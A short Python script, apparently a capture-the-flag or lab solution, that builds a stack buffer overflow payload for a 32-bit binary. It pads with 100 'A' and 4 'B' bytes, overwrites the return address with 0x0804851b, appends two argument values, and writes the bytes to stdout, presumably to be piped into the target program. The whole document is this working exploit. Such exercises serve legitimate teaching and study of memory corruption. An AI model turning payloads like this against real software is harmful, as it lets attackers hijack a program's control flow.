import sys
import subprocess

p_value = b'\x11\x12\x04\x08'  
q_value = b'\x62\x44\x64\x44'

myfunc_address = b'\xb6\x84\x04\x08'

payload = b'A' * 100 
payload += b'B' * 4  
payload += b'\x1b\x85\x04\x08'  
payload += p_value  
payload += q_value 

sys.stdout.buffer.write(payload)
